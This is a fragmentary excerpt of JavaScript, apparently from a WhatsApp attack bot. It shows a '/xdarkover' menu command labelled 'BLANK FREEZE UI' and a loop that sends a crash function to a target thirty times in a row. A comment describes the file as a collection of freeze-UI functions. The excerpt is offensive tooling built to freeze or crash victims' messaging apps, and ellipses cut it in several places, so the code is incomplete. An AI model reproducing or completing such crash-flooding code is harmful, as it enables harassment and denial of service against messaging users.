...
│ ↯ /xdarkover 62××       ☇ BLANK FREEZE UI (Not All Device)
└────────────────────────╯
...
`,
  ...
  (async () => {
    try {
      for (let r = 0; r < 30; r++) {
        await VnXNewFOrceImageNoClick(sock, target, mention = true)
        await sleep(700);
      }
    } catch (err) {
      console.error("Error high:", err);
...
///kumpulan function freeze blank UI\\\\
